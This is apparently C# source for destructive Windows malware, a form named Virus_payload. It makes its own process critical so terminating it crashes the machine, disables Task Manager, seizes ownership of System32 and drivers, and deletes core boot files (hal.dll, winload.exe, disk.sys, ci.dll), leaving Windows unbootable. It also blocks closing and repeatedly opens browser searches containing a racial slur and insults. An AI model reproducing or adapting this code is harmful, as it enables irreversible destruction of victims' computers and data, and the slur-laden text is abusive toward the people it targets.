using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Diagnostics;
using System.Runtime.InteropServices;
using Microsoft.Win32;
using System.IO;

namespace Virus_Destructive
{
    public partial class Virus_payload : Form
    {

    [DllImport("ntdll.dll", SetLastError = true)]
    private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);

    public Virus_payload()
    {
            InitializeComponent();
            this.TransparencyKey = this.BackColor;
            TopMost = true;
            r = new Random();
    }
        Random r;

        private void Virus_payload_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true;
        }

        private void Virus_payload_Load(object sender, EventArgs e)
        {
            int isCritical = 1;
            int BreakOnTermination = 0x1D;

            Process.EnterDebugMode();

            NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, sizeof(int));
            RegistryKey rk = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
            rk.SetValue("DisableTaskMgr", 1, RegistryValueKind.String);

            new Process() { StartInfo = new ProcessStartInfo("cmd.exe", @"/k color 47 && takeown /f C:\Windows\System32 && icacls C:\Windows\System32 /grant %username%:F && takeown /f C:\Windows\System32\drivers && icacls C:\Windows\System32\drivers /grant %username%:F && Exit") }.Start();
            tmr1.Start();
            tmr_add.Start();
            tmr_next_payload.Start();
        }

        private void tmr1_Tick(object sender, EventArgs e)
        {
            tmr1.Stop();
            //Path sys files and folders
            string hal_dll = @"C:\Windows\System32\hal.dll";
            string ci_dll = @"C:\Windows\System32\ci.dll";
            string winload_exe = @"C:\Windows\System32\winload.exe";
            string disk_sys = @"C:\Windows\System32\drivers\disk.sys";

            //Delete system files
            if(File.Exists(hal_dll))
            {
                File.Delete(hal_dll);
            }

            if (File.Exists(ci_dll))
            {
                File.Delete(ci_dll);
            }

            if (File.Exists(winload_exe))
            {
                File.Delete(winload_exe);
            }

            if (File.Exists(disk_sys))
            {
                File.Delete(disk_sys);
            }
        }

        private void tmr_add_Tick(object sender, EventArgs e)
        {
            tmr_add.Stop();
            int true_num = r.Next(5);

            if(true_num == 1)
            {
                System.Diagnostics.Process.Start("https://www.youtube.com/lolpippiou");
            }

            if (true_num == 2)
            {
                System.Diagnostics.Process.Start("https://www.google.com/search?q=the+chill+lost+regent+is+retarded+af+lol&oq=the+chill+lost+regent+is+retarded+af+lol");
            }

            if (true_num == 3)
            {
                System.Diagnostics.Process.Start("https://www.google.com/search?q=accaydenonpc+saying+a+messagebox+spammer+in+vbs+is+killbot.exe+lmao");
            }

            if (true_num == 4)
            {
                System.Diagnostics.Process.Start("https://www.google.com/search?q=nexipr+nigga+69");
            }

            if (true_num == 5)
            {
                System.Diagnostics.Process.Start("https://www.google.com/search?q=killbot.exe+isn%27t+real+and+it%27s+just+a+creepypasta+%3A%29");
            }

            if (true_num == 6)
            {
                System.Diagnostics.Process.Start("https://www.reddit.com/r/nosleep/comments/7b9792/killbot");
            }
            tmr_add.Start();
        }

        private void tmr_next_payload_Tick(object sender, EventArgs e)
        {
            tmr_next_payload.Stop();
            var NewForm = new Virus_sound();
            NewForm.ShowDialog();
        }
    }
}
